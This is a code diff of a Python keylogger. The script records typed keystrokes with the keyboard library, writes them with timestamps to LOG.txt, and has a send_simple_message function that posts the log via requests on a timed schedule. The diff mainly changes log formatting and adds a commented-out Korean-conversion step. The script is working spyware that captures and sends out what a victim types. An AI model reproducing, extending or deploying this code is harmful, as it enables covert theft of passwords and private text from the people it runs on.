@@ -2,6 +2,7 @@ import keyboard
 import requests
 import datetime
 import time
+#import conversion
 
 def file_flush():
     f = open("LOG.txt", 'w')
@@ -11,9 +12,12 @@ def file_flush():
 def file_input(recorded):
     now_time = datetime.datetime.now()
     w = open("LOG.txt", 'a')
+
     w.write("\n")
     w.write(str(recorded))
     w.write("\n")
+    w.write("\n")
+    w.write("--------------------------------------\n")
     w.write("\n")
     w.write(str(now_time))
     w.write("\n")
@@ -22,13 +26,22 @@ def file_input(recorded):
 
 def file_write(typedstr):
     w = open("LOG.txt", 'a')
-    w.write("--------------------------------------\n")
+
     w.write("\n")
     w.write(typedstr)
     w.write("\n")
     w.write("\n")
     w.write("--------------------------------------\n")
     w.close()
+
+# def conversion_kr():
+#     w = open("LOG.txt", 'a')
+#     w.write("--------------------------------------\n")
+#     w.write("\n")
+#     w.write(conversion.eng_kr())
+#     w.write("\n")
+#     w.write("\n")
+#     w.write("--------------------------------------\n")
 
 def send_simple_message(file_content):
     return requests.post(
@@ -48,6 +61,7 @@ if __name__ == "__main__":
          typedstr = " ".join(keyboard.get_typed_strings(recorded))
          file_input(recorded)
          file_write(typedstr)
+         # conversion_kr()
 
      if (status.tm_min == 10 ):
          if(status.tm_sec == 30):
